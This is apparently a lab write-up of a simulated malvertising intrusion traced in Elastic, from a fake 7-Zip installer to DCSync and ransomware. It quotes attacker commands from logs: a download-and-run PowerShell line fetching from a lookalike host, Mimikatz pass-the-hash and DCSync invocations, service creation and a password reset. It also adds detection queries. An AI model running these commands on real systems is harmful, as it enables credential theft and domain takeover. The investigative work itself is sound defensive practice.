# Malvertising and Fake Software Delivery Investigation (Elastic)

## Introduction

This investigation started with a user searching for 7-Zip and clicking a sponsored result that led to the lookalike domain `7zipp.org`. The evidence supports malvertising and fake software delivery; it does not show that the legitimate 7-Zip source code, update channel, or distribution process was compromised.

| Scope | Details |
| --- | --- |
| Platform | Elastic Security |
| Initial access | Sponsored result and fake 7-Zip installer |
| Main telemetry | Sysmon, PowerShell, process, file, DNS, and authentication events |
| Main activity | MSI execution, malicious service, credential dumping, Pass-the-Hash, DCSync, ransomware |
| Assessment | True Positive in a controlled lab |

I followed the process and file relationships from the downloaded MSI to the final ransomware activity. Credentials and keys shown in the lab are partially masked because this repository is public.

## Lab and Documentation Details

| Item | Details |
| --- | --- |
| Environment | Simulated enterprise threat-hunting lab |
| Evidence | Elastic, Sysmon, PowerShell, DNS, process, file, and authentication events |
| Scope | Initial download through domain compromise and ransomware impact |
| Last reviewed | July 2026 |

## Attack Sequence

| Order | Host or account | Evidence | Assessment |
| --- | --- | --- | --- |
| 1 | Victim workstation | Zone Identifier points to 7zipp.org | Fake-software download source identified |
| 2 | Victim workstation | msiexec.exe executes 7z2301-x64.msi | User execution confirmed |
| 3 | Victim workstation | PowerShell retrieves and runs 7z.ps1 | Payload execution confirmed |
| 4 | Victim workstation | 7zService created and started as SYSTEM | Service-based persistence established |
| 5 | Victim workstation | Invoke-NanoDump and Invoke-PowerExtract | LSASS credential dumping observed |
| 6 | james.cromwell | Mimikatz sekurlsa::pth command | Pass-the-Hash activity confirmed |
| 7 | anna.jones / WKSTN-02 | Account activity followed by new logons | Account manipulation and continued use supported |
| 8 | Domain Administrator | Invoke-SharpKatz DCSync output | Domain credential material extracted |
| 9 | Affected workstations | bomb.exe and .777zzz file events | Ransomware impact confirmed |

## Initial Investigation

Based on the scenario, the victim user searched online for software capable of extracting a password-protected archive and downloaded what appeared to be a legitimate 7-Zip installer.

As a starting point, I focused on identifying the exact software downloaded by the victim and determining whether the file originated from a trusted source.

To begin the investigation, I searched for browser-related activity associated with the victim workstation and reviewed Sysmon events that could reveal file download activity.

### Identifying the Downloaded File

By filtering for Chrome-related events and examining records containing URL information, I discovered a Sysmon Event ID 15 entry containing Zone Identifier metadata. This artifact is particularly useful because Windows records the original source URL of files downloaded from the internet.

The event revealed the following information:

`HostUrl=http://www.7zipp.org/a/7z2301-x64.msi`

<img width="1897" height="686" alt="Ekran görüntüsü 2026-06-15 194304" src="https://github.com/user-attachments/assets/d3d47ecb-c6d5-42cb-a6f1-ea64cd6100bc" />

> Sysmon Event ID 15 exposed the original download source through Zone Identifier metadata, revealing the URL used to download the malicious installer.


The domain immediately appeared suspicious. While the filename and installer attempted to mimic the legitimate 7-Zip software, the download originated from **7zipp.org**, a lookalike domain designed to imitate the official 7-Zip website.

This finding confirmed that the victim had downloaded a malicious installer disguised as legitimate software, establishing the initial access vector used in the compromise.

With the malicious download URL identified, the next objective was to determine the infrastructure behind the operation and identify the server hosting the malicious installer.


## Identifying the Hosting Infrastructure

After identifying the malicious download URL, the next step was to determine the infrastructure hosting the installer and identify the IP address associated with the suspicious domain.

To continue the investigation, I reviewed DNS-related events associated with the domain discovered during the previous phase.

By searching for references to `7zipp.org`, I identified multiple DNS resolution events that revealed the IP address associated with the malicious infrastructure.


<img width="558" height="678" alt="Ekran görüntüsü 2026-06-15 200127" src="https://github.com/user-attachments/assets/9cd479c2-88f3-45d9-8aed-c6c8b6a900d6" />


> DNS telemetry revealed that the malicious domain `7zipp.org` resolved to the IP address `206.189.34.218`, providing additional visibility into the infrastructure used to host the malicious installer.

The DNS records consistently resolved the domain to the same IP address, linking the suspicious domain to the infrastructure used during the lab. DNS resolution alone does not prove ownership or control.

## Tracking Malware Execution

With the hosting infrastructure identified, the next step was to determine whether the downloaded installer was successfully executed on the victim workstation and identify the process responsible for launching the malware.

To continue the investigation, I searched for references to the downloaded MSI package and reviewed Sysmon process creation events associated with the file.

Using the filename identified during the previous phase, I searched for:

`process.command_line : *7z2301*`

The results revealed a Sysmon Event ID 1 process creation event showing the execution of the downloaded installer through Windows Installer (`msiexec.exe`).

<img width="1898" height="397" alt="Ekran görüntüsü 2026-06-15 203740" src="https://github.com/user-attachments/assets/e1d3cc89-a556-4265-a70c-dfe2b9915beb" />

> Sysmon Event ID 1 confirmed execution of the downloaded MSI package. The CommandLine field showed that `msiexec.exe` launched the file `7z2301-x64.msi` from the victim's Downloads directory.

The process creation event revealed that the installer was executed through `msiexec.exe` with Process ID (PID) `2532`.

This finding confirmed that the malicious installer was not only downloaded but also successfully executed on the victim workstation, allowing the investigation to continue along the attack chain.


## Following the Payload Execution Chain

After confirming that the malicious MSI package had been executed, the next objective was to determine what actions were performed by the installer and identify any additional payloads retrieved from attacker-controlled infrastructure.

Malware installers commonly act as droppers, downloading and executing secondary payloads after the initial execution phase. To investigate this possibility, I searched for PowerShell activity containing HTTP references, as PowerShell is frequently abused to retrieve and execute remote content.

Using the following query:

`process.name : powershell.exe and http`

I identified several PowerShell execution events containing external URLs.

<img width="1898" height="681" alt="Ekran görüntüsü 2026-06-15 205949" src="https://github.com/user-attachments/assets/f40419e0-44eb-40f3-be0f-dea010976759" />

> PowerShell activity containing HTTP references revealed the execution chain initiated by the malicious installer.

Among the results, one PowerShell command stood out because it downloaded and immediately executed a remote script hosted on the same malicious infrastructure identified during the previous phases.

`powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`

The command used `Invoke-WebRequest (iwr)` to retrieve the remote PowerShell script `7z.ps1` and `Invoke-Expression (iex)` to execute the downloaded content directly in memory.

This finding confirmed that the MSI installer functioned as a dropper and launched a second-stage PowerShell payload, allowing the attacker to continue the compromise beyond the initial software installation.

With the second-stage payload identified, the next step was to investigate its activity and determine what actions were performed by the downloaded script, including any additional files, tools, or software components deployed on the victim workstation.

## Investigating Additional Components Deployed by the Script

After identifying the second-stage PowerShell payload, the next objective was to determine what actions were performed by the downloaded script and whether any additional software components were deployed on the victim workstation.

To investigate the script's behavior, I searched for references to `7z.ps1` and reviewed the processes spawned by the PowerShell payload.

Using the following query:

`7z.ps1`

I identified process creation events associated with the downloaded script.

<img width="1904" height="400" alt="Ekran görüntüsü 2026-06-15 211544" src="https://github.com/user-attachments/assets/7688696f-3038-42e6-a542-4e29aca8ec93" />

> Analysis of processes associated with `7z.ps1` revealed the execution of an additional binary named `7zlegit.exe`.

The process creation event revealed the full file path of the legitimate installer deployed by the script:

`C:\Windows\Temp\7zlegit.exe`

The command line indicated that the binary was executed silently using the `/S` switch, suggesting that the malware attempted to install a legitimate version of the software in order to reduce suspicion and maintain the appearance of a normal installation process.

This behavior is commonly observed in software supply chain compromises, where threat actors deploy a legitimate application alongside malicious components to avoid immediately alerting the victim to the compromise.

With the legitimate installer identified, the next step was to determine whether additional persistence mechanisms or malicious services were created by the attacker.


## Investigating Service Installation and Persistence

After identifying the legitimate installer deployed by the PowerShell payload, the next step was to determine whether the attacker established persistence on the compromised workstation.

Malware frequently achieves persistence by creating Windows services that automatically execute whenever the system starts. To investigate this possibility, I continued reviewing activity associated with the previously identified PowerShell script and examined the processes it spawned.

Using the following query:

`7z.ps1`

I identified additional child processes launched by the malicious script.

<img width="1897" height="503" alt="Ekran görüntüsü 2026-06-15 212434" src="https://github.com/user-attachments/assets/7649168a-d567-4fa3-a0c2-49cf24faa6b9" />

> Analysis of processes spawned by the PowerShell payload revealed the creation and execution of a new Windows service.

Among the observed activities, the script executed `sc.exe`, a legitimate Windows utility used to create and manage services. The command line revealed that a new service named `7zService` was created and configured to start automatically during system boot.

`"C:\Windows\system32\sc.exe" create 7zService binpath= "C:\Program Files\7-Zip\7zipp.exe" start=auto obj=LocalSystem`

Shortly after creation, the service was started using the following command:

`"C:\Windows\system32\sc.exe" start 7zService`

The service was configured to run under the `LocalSystem` account, granting it extensive privileges on the host. Additionally, the `start=auto` parameter ensured that the service would automatically execute whenever the system restarted, providing the attacker with a reliable persistence mechanism.

This finding confirmed that the malicious script established persistence by creating and launching the 7zService Windows service, enabling continued access to the compromised workstation.

The combination of automatic startup, LocalSystem privileges, and attacker-controlled binaries significantly increased the attacker's ability to maintain long-term access and execute additional malicious actions on the host.

With the service identified, the next step was to determine its execution context. The available events showed the account and service activity, but they did not include enough network evidence to confirm a command-and-control channel.

## Investigating Service Execution Context

After identifying the service created by the PowerShell payload, I checked which account executed it after installation.

To continue the investigation, I searched for activity associated with the service identified during the previous phase:

`7zService`

The results revealed multiple events linked to the implanted service, including user context information.

<img width="1906" height="600" alt="Ekran görüntüsü 2026-06-15 215535" src="https://github.com/user-attachments/assets/6e481b8d-3bed-43b7-98b3-a1a17045636f" />

> Service-related events showed that the implanted service was executed under the SYSTEM account.

The associated events consistently identified the executing account as:

`SYSTEM`

This behavior was consistent with the service configuration observed during the persistence phase, where the service was created to run under the `LocalSystem` account.

Running under the SYSTEM account provided the malware with extensive privileges on the host, allowing the attacker to perform privileged operations and continue post-compromise activities without requiring additional user interaction.

This finding confirmed that the implanted service successfully executed with SYSTEM-level privileges, enabling the attacker to maintain control of the compromised workstation and continue progressing through the attack chain.

With the execution context identified, the next step was to investigate the attacker's post-compromise activities and determine how credentials were harvested from the environment.

## Investigating Credential Harvesting Activity

After confirming that the implanted service was successfully running with SYSTEM-level privileges, the next objective was to determine whether the attacker attempted to access credentials stored on the compromised workstation.

Credential dumping is a common post-compromise technique used by attackers to obtain password hashes and other authentication material from the Local Security Authority Subsystem Service (LSASS) process. To investigate potential credential access activity, I searched for references to LSASS within PowerShell script block logs.

Using the following query:

`lsass`

I identified multiple PowerShell script block events containing code related to LSASS memory dumping and credential extraction.

<img width="1908" height="681" alt="Ekran görüntüsü 2026-06-15 220927" src="https://github.com/user-attachments/assets/57e2c86b-952d-485a-8815-4eefeb7b527f" />

> PowerShell script block logging revealed tools designed to dump and extract credentials from LSASS memory.

Among the identified functions were:

`Invoke-NanoDump
Invoke-PowerExtract`

The script content showed that `Invoke-NanoDump` was responsible for creating an LSASS memory dump, while `Invoke-PowerExtract` was designed to parse the resulting dump file and recover credential material from it.

The most significant evidence was found directly within the script description:

`Invoke-PowerExtract parses and extracts information (e.g. NT-hashes) from memory dumps of the LSASS process`

This description explicitly identified the tool's purpose and confirmed that it was being used to extract credentials from the dumped LSASS memory.

Based on the PowerShell script block logs, the tool used by the attacker to parse the LSASS dump and extract credentials was:

`Invoke-PowerExtract`

This finding confirmed that the attacker had successfully progressed to the Credential Access phase of the attack and was actively attempting to obtain account credentials for further privilege escalation and lateral movement.

With the credential extraction mechanism identified, the next step was to determine which credentials were recovered and how they were subsequently used throughout the intrusion.


## Investigating Credential Abuse and Pass-the-Hash Activity

After identifying `Invoke-PowerExtract` and confirming that credentials were extracted from the LSASS memory dump, the next objective was to determine whether the harvested credentials were subsequently abused by the attacker.

Credential dumping is rarely the final objective of an intrusion. In most cases, attackers leverage the recovered credentials to gain access to additional accounts, escalate privileges, or move laterally throughout the environment.

Since NTLM hashes are commonly abused through Pass-the-Hash techniques, I searched for evidence of Mimikatz activity associated with the credential dumping phase.

Using the following query:

`mimikatz`

I identified process creation events showing the download and execution of Mimikatz on the compromised workstation.

<img width="1902" height="621" alt="Ekran görüntüsü 2026-06-15 222920" src="https://github.com/user-attachments/assets/d000440c-22c9-4ebb-b708-4f61ec546968" />

> Process creation events revealed the execution of Mimikatz and exposed the command-line arguments used by the attacker.

To further investigate the functionality used by Mimikatz, I pivoted into the command-line arguments and searched for:

`process.command_line : *sekurlsa*`

This query isolated Mimikatz credential-access activity and revealed the specific module used by the attacker.

<img width="1898" height="619" alt="Ekran görüntüsü 2026-06-15 230310" src="https://github.com/user-attachments/assets/66089c1b-cac7-4647-a765-2aa86600ada1" />

> Searching for `sekurlsa` within process command-line arguments revealed the attacker's use of Mimikatz Pass-the-Hash functionality. The command exposed the targeted account (`james.cromwell`), the associated NTLM hash, and the execution of a new PowerShell process under the compromised identity.

Reviewing the command-line parameters revealed the use of the following Mimikatz module:

`sekurlsa::pth`

The `sekurlsa::pth` command is used to perform a Pass-the-Hash attack, allowing an attacker to authenticate as another user using an NTLM hash rather than the user's plaintext password.

The command line exposed the compromised account and associated NTLM hash:

`james.cromwell:B852A0B8************************`

The complete command showed that the attacker launched a new PowerShell process using the recovered NTLM hash:

`.\mimikatz.exe "sekurlsa::pth /user:james.cromwell /domain:swiftspendfinancial.thm /ntlm:B852A0B8************************ /run:powershell.exe"`

This finding confirmed that the attacker successfully leveraged harvested NTLM credentials to impersonate the account james.cromwell through a Pass-the-Hash attack.

With successful credential abuse confirmed, the next step was to investigate how the compromised credentials were used to expand access within the environment and identify any additional accounts targeted by the attacker.

## Investigating Account Manipulation Activity

After successfully authenticating as `james.cromwell` through a Pass-the-Hash attack, the next objective was to determine how the attacker used the newly compromised account.

Attackers frequently modify user accounts after obtaining elevated access in order to establish additional footholds, maintain persistence, or expand control within the environment.

To investigate potential account management activity, I searched for executions of the Windows account administration utility:

`process.name : net.exe`

The results revealed several account enumeration and management commands, including domain user and group-related activity.

<img width="1892" height="629" alt="Ekran görüntüsü 2026-06-15 231813" src="https://github.com/user-attachments/assets/8667bfb3-2d2b-4e8c-8737-6e8951213f4f" />

> Analysis of `net.exe` activity revealed commands used to enumerate and modify domain accounts.

Among the observed commands, one entry immediately stood out:

`"C:\Windows\system32\net.exe" users /domain anna.jones pwn3d***`

The command showed that the attacker reset the password of the domain account `anna.jones`.

The new password assigned to the account was:

`pwn3d***`

This finding confirmed that the attacker progressed beyond credential theft and actively manipulated domain user accounts after compromising `james.cromwell`.

With evidence of account modification identified, the next step was to investigate whether the attacker leveraged the newly modified credentials to access additional systems, escalate privileges, or continue expanding control within the environment.

## Investigating Use of the Modified Account

After identifying that the attacker reset the password of `anna.jones`, the next objective was to determine whether the newly modified account was subsequently used within the environment.

Attackers commonly leverage compromised or newly modified accounts to expand access, move laterally, and continue post-compromise operations. To investigate this possibility, I searched for activity associated with the account after the password reset.

Using the following query:

`powershell.connected_user.name : anna.jones`

I identified multiple PowerShell events linked to the account.

<img width="1889" height="588" alt="Ekran görüntüsü 2026-06-15 232311" src="https://github.com/user-attachments/assets/bdc4fdb9-038c-4c60-a01b-56a765c3b139" />

> PowerShell events associated with `anna.jones` revealed the workstation where the account was actively used after the password reset.

Reviewing the results showed that the account was actively used on `WKSTN-02` after the password reset.

The agent.hostname field identified WKSTN-02 as the workstation where PowerShell activity associated with the account anna.jones was observed.

This finding confirmed that the modified anna.jones account was used on WKSTN-02 following the password reset activity, providing evidence that the attacker continued operating within the environment using the newly controlled account.

With the workstation identified, the next step was to investigate what actions were performed on WKSTN-02 and determine whether the attacker obtained additional credentials or sensitive information.

## Investigating Additional Credentials Discovered on WKSTN-02

After confirming that the attacker successfully used the modified `anna.jones` account on `WKSTN-02`, the next objective was to determine whether additional credentials were discovered or leveraged from the newly accessed workstation.

Attackers frequently search for privileged credentials after gaining access to new systems in order to expand their access, perform administrative actions, and continue progressing through the environment.

To investigate this possibility, I searched for PowerShell credential objects associated with the compromised account.

Using the following query:

`*PSCredential* AND user.name:*anna*`

I identified PowerShell activity involving the creation of a PSCredential object.

<img width="1898" height="593" alt="Ekran görüntüsü 2026-06-15 233904" src="https://github.com/user-attachments/assets/6c574573-cb0b-4a37-9f60-c696c91f0c7e" />

> PowerShell execution logs revealed the creation of a PSCredential object containing additional credentials used by the attacker.

Reviewing the command-line details exposed the following PowerShell statements:

`$username='SSF\itadmin';
$password='No06@***';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$new_creds = New-Object System.Management.Automation.PSCredential($username,$securePassword)
`

The command created a PSCredential object using a newly discovered account and password. Analysis of the PowerShell statements revealed the credentials `SSF\itadmin` and `No06@***`, exposing a newly discovered privileged account leveraged by the attacker.
Further analysis showed that these credentials were subsequently used to perform domain administration activities through PowerShell. This indicated that the attacker had successfully expanded access beyond the previously compromised accounts and obtained a more privileged level of control within the environment.

This finding confirmed that the attacker obtained and leveraged a new privileged account, providing additional opportunities for privilege escalation, account manipulation, and lateral movement within the environment.

With the newly discovered credentials identified, the next step was to investigate how the `SSF\itadmin` account was used and determine what actions were performed using its elevated privileges.


## Investigating Domain Administrator Credential Access

After identifying the additional credentials associated with `SSF\itadmin`, the next objective was to determine how the attacker used this newly acquired account and whether it was leveraged to target highly privileged users within the domain.

Compromising administrative accounts is often a key objective during post-exploitation activities, as it allows attackers to gain broader access, establish dominance over the environment, and move toward complete domain compromise.

To investigate potential credential access activity, I searched for PowerShell scripts executed by the compromised account that referenced domain administrator operations.

Using the following query:

`*.ps1* AND user.name:*anna* AND *damian*`

I identified PowerShell activity associated with a credential access operation targeting the domain administrator account.

<img width="1891" height="416" alt="Ekran görüntüsü 2026-06-15 234914" src="https://github.com/user-attachments/assets/12b76dcf-0767-4065-a589-beddb69db3b9" />

> PowerShell execution logs revealed the download and execution of SharpKatz, a PowerShell-based credential access tool.

Reviewing the command-line arguments exposed the following PowerShell script:

`Invoke-SharpKatz.ps1`

The command showed that the attacker downloaded and executed the script directly from a remote repository before launching a credential extraction operation:

`iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1 -useb)`

Further analysis revealed that the script was used to perform a DCSync operation targeting the domain administrator account:

`Invoke-SharpKatz -Command "-Command dcsync --DomainController DC-01.swiftspendfinancial.thm --User damian.hall"`

DCSync attacks allow an attacker to request password data directly from Active Directory by impersonating a Domain Controller. This technique is commonly used to obtain NTLM password hashes of privileged accounts without requiring interactive access to the target system.

This finding confirmed that the attacker leveraged Invoke-SharpKatz.ps1 to perform a DCSync attack against the domain administrator account, significantly escalating access and moving closer to complete domain compromise.

With evidence of DCSync activity identified, the next step was to determine what credentials were obtained from the operation and how they were subsequently leveraged by the attacker.

## Investigating Domain Administrator Credential Dumping

After identifying the execution of `Invoke-SharpKatz.ps1` and confirming that a DCSync operation targeted the domain administrator account, the next objective was to determine which credentials were obtained from Active Directory.

Successful DCSync attacks can expose highly sensitive credential material, including NTLM hashes and Kerberos encryption keys, allowing attackers to impersonate privileged users without directly accessing their workstations.

To investigate the credential dumping output, I searched for references to the SharpKatz script and reviewed the credential data returned by the DCSync operation.

Using the following query:

`*Invoke-SharpKatz.ps1* and *aes*`

I identified PowerShell invocation logs containing credential information extracted from Active Directory.

<img width="1893" height="678" alt="Ekran görüntüsü 2026-06-15 235702" src="https://github.com/user-attachments/assets/7231575f-fd83-4f23-82ac-2be31f5eb01a" />

> DCSync output revealed multiple credential artifacts associated with the domain administrator account, including NTLM hashes and Kerberos AES encryption keys.

Reviewing the DCSync output revealed the AES256 Kerberos key associated with the domain administrator account:

`f28a16b8d3f5****************************************************`

The presence of Kerberos AES256 keys confirmed that the attacker successfully extracted credential data directly from Active Directory through the DCSync technique.

This finding confirmed that the attacker successfully extracted the Kerberos AES256 key of the domain administrator account through a DCSync operation, obtaining highly privileged authentication material capable of supporting further privilege escalation and domain-wide compromise.

With the domain administrator credentials identified, the next step was to investigate how the attacker leveraged these credentials and determine whether they were used to establish persistence or further expand access within the domain.


## Investigating Ransomware Impact Across the Environment

After identifying the successful DCSync attack and confirming that the attacker had obtained domain administrator credentials, the next objective was to determine whether those privileges were used to deploy ransomware throughout the environment.

Ransomware operators commonly use privileged accounts to execute malware across multiple systems and maximize operational impact. To investigate potential ransomware activity, I reviewed executable activity associated with the compromised domain administrator account.

Using the following query:

`user.name : damian.hall and process.name : *.exe
`

<img width="1145" height="684" alt="Ekran görüntüsü 2026-06-16 000724" src="https://github.com/user-attachments/assets/8f5b2ab7-6ac6-4a4d-9e54-b419390efb88" />


I identified the execution of a suspicious binary named `bomb.exe`.

Further investigation focused on file creation activity associated with the ransomware process.

Using the following query:

`process.name : bomb.exe and event.code : 11
`

I identified Sysmon File Create events generated by the ransomware.

<img width="1891" height="676" alt="Ekran görüntüsü 2026-06-16 001001" src="https://github.com/user-attachments/assets/64369d5a-8c8c-4ac7-b8c4-bbbc5d4488f9" />

> File creation events associated with `bomb.exe` revealed the creation of encrypted files with a new ransomware-specific extension.

Reviewing the results showed 46 Sysmon Event ID 11 file-creation events for files using the `.777zzz` extension across the affected workstations. This confirms ransomware-related file activity in the lab, but the event count should not automatically be read as the number of unique files without checking the file paths and removing duplicates.

The activity began with fake software delivery and progressed through payload execution, persistence, credential access, Pass-the-Hash, domain compromise, and ransomware impact.

## KQL Search Notes

The searches below capture the main pivots used in the lab. Data views, field mappings, and event categories should be narrowed for a production environment.

### Download and MSI execution

```kql
process.name : "msiexec.exe" and process.command_line : "*7z2301-x64.msi*"
```

### PowerShell payload and credential-dumping activity

```kql
process.name : "powershell.exe" and
process.command_line : ("*7z.ps1*" or "*Invoke-NanoDump*" or "*Invoke-PowerExtract*")
```

### Pass-the-Hash and DCSync indicators

```kql
process.command_line : ("*sekurlsa::pth*" or "*Invoke-SharpKatz*" or "*DCSync*")
```

### Ransomware file activity

```kql
process.name : "bomb.exe" and event.code : "11"
```

## Evidence Boundaries

- A lookalike download site and sponsored result support malvertising and fake software delivery, not a confirmed software supply-chain compromise.
- DNS resolution links the domain to observed infrastructure but does not prove who controlled it.
- The service events show SYSTEM execution; they do not by themselves prove C2 communication.
- The 46 Sysmon events represent observed file-creation records. Unique impacted files and hosts should be calculated separately.
- Lab passwords, hashes, and Kerberos keys are masked in this public write-up.

## Containment and Recovery

- Isolate affected workstations and block the suspicious domain, IP, MSI, scripts, and ransomware artifacts.
- Stop and remove the malicious service only after evidence collection.
- Reset affected accounts, revoke active sessions and Kerberos tickets, and rotate privileged credentials.
- Review Domain Controller logs for DCSync activity and unauthorized account changes.
- Hunt across the environment for the same PowerShell functions, service name, process tree, and file extension.
- Restore affected files from validated backups and confirm that persistence has been removed before reconnecting hosts.

## MITRE ATT&CK Mapping

| Tactic                             | Technique                                        | ID        | Evidence                                                                                                                      |
| ---------------------------------- | ------------------------------------------------ | --------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Initial Access                     | Drive-by Compromise                              | T1189     | The victim downloaded a malicious MSI installer from the spoofed domain `7zipp.org` after clicking a sponsored search result. |
| Execution                          | User Execution: Malicious File                   | T1204.002 | The victim executed the malicious file `7z2301-x64.msi` through `msiexec.exe`.                                                |
| Defense Evasion                    | System Binary Proxy Execution: Msiexec           | T1218.007 | `msiexec.exe` executed the downloaded MSI package.                                                                           |
| Execution                          | PowerShell                                       | T1059.001 | The MSI installer launched PowerShell and executed the remote script `7z.ps1`.                                                |
| Persistence                        | Create or Modify System Process: Windows Service | T1543.003 | The attacker created and started the `7zService` Windows service using `sc.exe`.                                              |
| Credential Access                  | OS Credential Dumping: LSASS Memory              | T1003.001 | `Invoke-NanoDump` and `Invoke-PowerExtract` were used to dump and parse LSASS memory.                                         |
| Credential Access                  | DCSync                                           | T1003.006 | `Invoke-SharpKatz.ps1` performed a DCSync attack against the domain administrator account.                                    |
| Defense Evasion / Lateral Movement | Pass the Hash                                    | T1550.002 | Mimikatz `sekurlsa::pth` was used with the NTLM hash of `james.cromwell`.                                                     |
| Account Manipulation               | Account Manipulation                             | T1098     | The attacker reset the password of `anna.jones` using administrative access.                                                  |
| Discovery                          | Account Discovery                                | T1087     | `net.exe` was used to enumerate and interact with domain accounts.                                                            |
| Impact                             | Data Encrypted for Impact                        | T1486     | The ransomware binary `bomb.exe` encrypted files and created the `.777zzz` extension.                                         |


## Conclusion

The evidence supports a fake software delivery chain that started when the user downloaded and executed a malicious MSI from a lookalike 7-Zip site.

From there, the investigation followed PowerShell execution, a service running as SYSTEM, LSASS credential dumping, Pass-the-Hash activity, account manipulation, DCSync, and finally `bomb.exe` creating files with the `.777zzz` extension. The sequence shows how one untrusted software download can develop into a domain-level incident when credential access and privileged activity are not contained early.

The most useful lesson for me was to keep the conclusion tied to the telemetry. Some findings were confirmed directly, while others—such as infrastructure ownership, the exact account-reset command, and total unique encrypted files—needed more evidence than the lab provided.
